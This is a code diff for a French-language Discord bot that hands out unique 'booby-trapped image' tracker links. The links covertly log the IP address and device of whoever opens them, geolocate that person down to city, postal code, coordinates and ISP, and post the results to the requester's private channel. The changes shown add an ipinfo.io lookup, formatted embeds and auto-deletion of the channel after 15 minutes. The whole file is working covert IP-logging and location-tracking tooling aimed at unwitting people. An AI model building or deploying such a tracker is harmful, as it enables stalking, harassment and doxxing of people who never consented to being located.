@@ -16,18 +16,19 @@ const {
   ActionRowBuilder,
   ButtonStyle,
   ChannelType,
-  PermissionsBitField
+  PermissionsBitField,
+  EmbedBuilder
 } = require('discord.js');
 
 // CONFIG
 const port = process.env.PORT || 3000;
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
+const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
 const TRACKER_BASE_URL = "https://tracker-09q2.onrender.com/image.jpg?u=";
 const BUTTON_CHANNEL_NAME = "📎・génère-lien-tracker";
 const CLIENTS_FILE = './clients.json';
 const TRACKER_MESSAGE_FILE = './tracker-message.json';
 
-// EXPRESS SERVER
 const app = express();
 app.use(cors());
 const deviceDetector = new DeviceDetector();
@@ -46,36 +47,34 @@ app.get('/image.jpg', async (req, res) => {
   const userAgent = req.headers['user-agent'];
   const device = deviceDetector.parse(userAgent);
 
-  let log = `📸 **Image piégée ouverte !**\n`;
-  log += `IP : ${ip}\n`;
-  log += `Appareil : ${device.client?.name || 'Inconnu'} - ${device.os?.name || 'Inconnu'}\n`;
+  let geo = {};
+  let ipinfo = {};
 
   try {
-    const geo = lookup.get(ip);
-    const loc = geo?.location;
+    geo = lookup.get(ip) || {};
+  } catch (e) {}
 
-    log += `🌍 Localisation :\n`;
-    log += `• Pays : ${geo?.country?.names?.fr || '❌ Introuvable'}\n`;
-    log += `• Région : ${geo?.subdivisions?.[0]?.names?.fr || '❌ Introuvable'}\n`;
-    log += `• Ville : ${geo?.city?.names?.fr || '❌ Introuvable'}\n`;
-    log += `• Code postal : ${geo?.postal?.code || '❌ Introuvable'}\n`;
-    log += `• Coordonnées : ${loc?.latitude || '?'} , ${loc?.longitude || '?'}\n`;
-    log += `• FAI : ${geo?.traits?.isp || '❌ Introuvable'}\n`;
+  try {
+    const response = await axios.get(`https://ipinfo.io/${ip}?token=${IPINFO_TOKEN}`);
+    ipinfo = response.data || {};
+  } catch (e) {}
 
-    const proxyFlags = [];
-    if (geo?.traits?.is_anonymous_proxy) proxyFlags.push("🔒 Proxy anonyme");
-    if (geo?.traits?.is_satellite_provider) proxyFlags.push("🛰️ Satellite");
-    if (geo?.traits?.is_legitimate_proxy) proxyFlags.push("🧪 Proxy déclaré");
-
-    log += proxyFlags.length > 0
-      ? `⚠️ Réseau suspect :\n- ${proxyFlags.join('\n- ')}\n`
-      : `✅ Connexion légitime\n`;
-
-  } catch (err) {
-    log += `❌ Erreur de géolocalisation : ${err.message}`;
-  }
-
-  console.log(log);
+  const embed = new EmbedBuilder()
+    .setTitle("📸 Image piégée ouverte !")
+    .setDescription(`**IP :** ${ip}\n**Appareil :** ${device.client?.name || 'Inconnu'} - ${device.os?.name || 'Inconnu'}`)
+    .setColor(0xff6600)
+    .addFields(
+      { name: "🌍 Localisation", value: `
+**Pays :** ${ipinfo.country || geo?.country?.names?.fr || '❌'}
+**Région :** ${ipinfo.region || geo?.subdivisions?.[0]?.names?.fr || '❌'}
+**Ville :** ${ipinfo.city || geo?.city?.names?.fr || '❌'}
+**Code postal :** ${ipinfo.postal || geo?.postal?.code || '❌'}
+**Coordonnées :** ${ipinfo.loc || `${geo?.location?.latitude || '?'} , ${geo?.location?.longitude || '?'}`}
+**FAI :** ${ipinfo.org || geo?.traits?.isp || '❌'}
+`.trim() }
+    )
+    .setFooter({ text: "🔍 Tracker automatique", iconURL: "https://cdn-icons-png.flaticon.com/512/3524/3524393.png" })
+    .setTimestamp();
 
   try {
     if (fs.existsSync(CLIENTS_FILE)) {
@@ -84,7 +83,7 @@ app.get('/image.jpg', async (req, res) => {
 
       if (channelId) {
         await axios.post(`https://discord.com/api/v10/channels/${channelId}/messages`, {
-          content: log
+          embeds: [embed]
         }, {
           headers: {
             Authorization: `Bot ${DISCORD_TOKEN}`,
@@ -126,11 +125,11 @@ client.once(Events.ClientReady, async () => {
     try {
       const msg = await channel.messages.fetch(messageId);
       if (msg) {
-        console.log("✅ Message existant déjà présent.");
+        console.log("✅ Message bouton déjà en place.");
         return;
       }
     } catch (e) {
-      console.log("⚠️ Ancien message introuvable. On va en recréer un.");
+      console.log("⚠️ Ancien message introuvable, on le recrée.");
     }
   }
 
@@ -177,7 +176,7 @@ client.on(Events.InteractionCreate, async interaction => {
     const trackerUrl = `${TRACKER_BASE_URL}${uniqueId}`;
 
     await privateChannel.send({
-      content: `🎯 Voici ton lien tracker unique :\n<${trackerUrl}>\n\n🕵️‍♂️ Les connexions détectées s'afficheront ici automatiquement.`
+      content: `🎯 Voici ton lien tracker unique :\n<${trackerUrl}>\n\n🕵️‍♂️ Les connexions détectées s'afficheront ici automatiquement.\n\n⏳ *Ce salon sera supprimé dans 15 minutes...*`
     });
 
     let clients = {};
@@ -192,6 +191,16 @@ client.on(Events.InteractionCreate, async interaction => {
       content: `✅ Ton lien a été généré ici : <#${privateChannel.id}>`,
       ephemeral: true
     });
+
+    // 🧹 Suppression du salon après 15 minutes
+    setTimeout(async () => {
+      try {
+        await privateChannel.delete();
+        console.log(`🗑️ Salon supprimé : ${privateChannel.name}`);
+      } catch (err) {
+        console.error("❌ Erreur suppression salon :", err.message);
+      }
+    }, 15 * 60 * 1000); // 15 min
 
   } catch (err) {
     console.error("❌ Erreur interaction :", err);
